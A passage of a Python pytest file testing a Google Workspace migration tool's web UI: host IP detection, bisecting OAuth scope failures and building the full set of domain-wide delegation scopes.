        monkeypatch.setattr(webui, "_HOST_INFO_CACHE", None)
        monkeypatch.setattr(webui, "_primary_ip", lambda: "78.47.176.120")
        info = webui.host_info()
        assert info["location"] == "78.47.176.120"

    def test_loopback_is_treated_as_local_not_a_real_address(self, monkeypatch):
        monkeypatch.setattr(webui, "_HOST_INFO_CACHE", None)
        monkeypatch.setattr(webui, "_primary_ip", lambda: "127.0.0.1")
        info = webui.host_info()
        assert info["location"] == "Local machine"

    def test_primary_ip_never_raises_even_with_no_network(self, monkeypatch):
        """connect() on a UDP socket can still fail (no route, no interface
        up) -- this must fall back to loopback, never propagate an
        exception into host_info() and break /api/config entirely."""
        import socket as socket_mod

        class _Boom:
            def connect(self, *a):
                raise OSError("network unreachable")

            def close(self):
                pass

        monkeypatch.setattr(socket_mod, "socket", lambda *a, **k: _Boom())
        assert webui._primary_ip() == "127.0.0.1"


class TestScopeDiagnosis:
    """
    A single unauthorised (or not-yet-propagated) scope fails the *entire*
    combined token request with the same generic unauthorized_client error,
    whatever else in the request is fine -- diagnosed live, more than once,
    by manually minting one token per scope over SSH before this existed.
    This is that same bisection, built in.
    """

    @pytest.fixture(autouse=True)
    def _settings(self, tmp_path, monkeypatch):
        key = tmp_path / "sa.json"
        key.write_text("{}")
        monkeypatch.setenv("SOURCE_SA_KEY", str(key))
        monkeypatch.setenv("SOURCE_ADMIN", "admin@src.example.com")
        monkeypatch.setenv("TARGET_SA_KEY", str(key))
        monkeypatch.setenv("TARGET_ADMIN", "admin@tgt.example.com")

    def _fake_from_file(self, failing_scopes):
        class _FakeCreds:
            def __init__(self, scopes):
                self.scopes = scopes

            def with_subject(self, subject):
                return self

            def refresh(self, request):
                if any(s in failing_scopes for s in self.scopes):
                    raise RuntimeError(
                        "unauthorized_client: Client is unauthorized ...")

        def fake_from_file(path, scopes):
            return _FakeCreds(scopes)
        return fake_from_file

    def test_a_passing_combined_check_reports_every_scope_ok_without_bisecting(
            self, monkeypatch):
        calls = []
        real_fake = self._fake_from_file(failing_scopes=set())

        def counting_fake(path, scopes):
            calls.append(scopes)
            return real_fake(path, scopes)

        monkeypatch.setattr(
            "google.oauth2.service_account.Credentials.from_service_account_file",
            staticmethod(counting_fake))
        result = webui.scope_diagnosis("source")
        assert result["combined_ok"] is True
        assert result["scopes"] and all(s["ok"] for s in result["scopes"])
        # One call for the combined check -- a pass answers every scope at
        # once, so bisecting on top of that would be pure waste.
        assert len(calls) == 1

    def test_a_failing_combined_check_bisects_to_find_the_culprit(self, monkeypatch):
        from config import Settings, source_scopes

        bad = source_scopes(Settings())[0]
        monkeypatch.setattr(
            "google.oauth2.service_account.Credentials.from_service_account_file",
            staticmethod(self._fake_from_file(failing_scopes={bad})))
        result = webui.scope_diagnosis("source")
        assert result["combined_ok"] is False
        assert result["error"]
        failing = [s["scope"] for s in result["scopes"] if not s["ok"]]
        assert failing == [bad]
        # Everything else in the same request must be reported healthy,
        # not swept up as "also unauthorized" just because the combined
        # request failed.
        assert all(s["ok"] for s in result["scopes"] if s["scope"] != bad)

    def test_unknown_tenant_is_rejected(self):
        result = webui.scope_diagnosis("both")
        assert "tenant" in result["error"]

    def test_missing_admin_is_reported_without_attempting_a_token_mint(
            self, monkeypatch):
        monkeypatch.delenv("SOURCE_ADMIN", raising=False)
        calls = []
        monkeypatch.setattr(
            "google.oauth2.service_account.Credentials.from_service_account_file",
            staticmethod(lambda *a, **k: calls.append(1)))
        result = webui.scope_diagnosis("source")
        assert "no admin configured" in result["error"]
        assert not calls

    def test_missing_key_file_is_reported(self, monkeypatch, tmp_path):
        monkeypatch.setenv("SOURCE_SA_KEY", str(tmp_path / "absent.json"))
        result = webui.scope_diagnosis("source")
        assert "no key file" in result["error"]


class TestDwdPayloadFullScopeUnion:
    """
    The "paste once, never revisit" scope lines: every scope source/target
    could ever need across every transfer mode and optional-feature toggle,
    not just whichever ones are on right now -- because the Admin Console
    editor replaces the whole grant on every edit and re-triggers
    propagation delay (~2 min typical, up to 30) for the ENTIRE grant, not
    just the newly added scope. A narrower, current-settings-only line risks
    that same live incident recurring every time a feature toggle changes.
    """

    @pytest.fixture(autouse=True)
    def _settings(self, tmp_path, monkeypatch):
        key = tmp_path / "sa.json"
        key.write_text(json.dumps({"client_id": "123"}))
        monkeypatch.setenv("SOURCE_SA_KEY", str(key))
        monkeypatch.setenv("SOURCE_ADMIN", "admin@src.example.com")
        monkeypatch.setenv("TARGET_SA_KEY", str(key))
        monkeypatch.setenv("TARGET_ADMIN", "admin@tgt.example.com")
        monkeypatch.setenv("SOURCE_DOMAIN", "src.example.com")
        monkeypatch.setenv("TARGET_DOMAIN", "tgt.example.com")

    def test_full_union_is_a_superset_of_the_current_settings_scopes(self):
        payload = webui.dwd_payload()
        source_line = next(t for t in payload["tenants"] if t["side"] == "source")
        target_line = next(t for t in payload["tenants"] if t["side"] == "target")
        assert set(source_line["scope_list"]) <= set(payload["migrate_source_full"])
        assert set(target_line["scope_list"]) <= set(payload["migrate_target_full"])

    def test_full_union_covers_both_read_and_write_drive_variants(self):
        from config import DRIVE_READONLY_SCOPE, DRIVE_WRITE_SCOPE

        payload = webui.dwd_payload()
        full = set(payload["migrate_source_full"])
        # download_upload asks for the readonly scope, server_side/link_flip
        # ask for the write scope in its place -- a single current-settings
        # line only ever carries one of the two.
        assert DRIVE_READONLY_SCOPE in full
        assert DRIVE_WRITE_SCOPE in full

    def test_full_union_covers_every_optional_feature_scope(self):
        from config import (
            CHAT_MEMBERSHIP_SCOPE, CONTACTS_WRITE_SCOPE, GMAIL_SETTINGS_SCOPE,
            SSO_WRITE_SCOPE, TASKS_WRITE_SCOPE,
        )

        payload = webui.dwd_payload()
        full = set(payload["migrate_target_full"])
        for scope in (GMAIL_SETTINGS_SCOPE, CHAT_MEMBERSHIP_SCOPE,
                     CONTACTS_WRITE_SCOPE, TASKS_WRITE_SCOPE, SSO_WRITE_SCOPE):
            assert scope in full
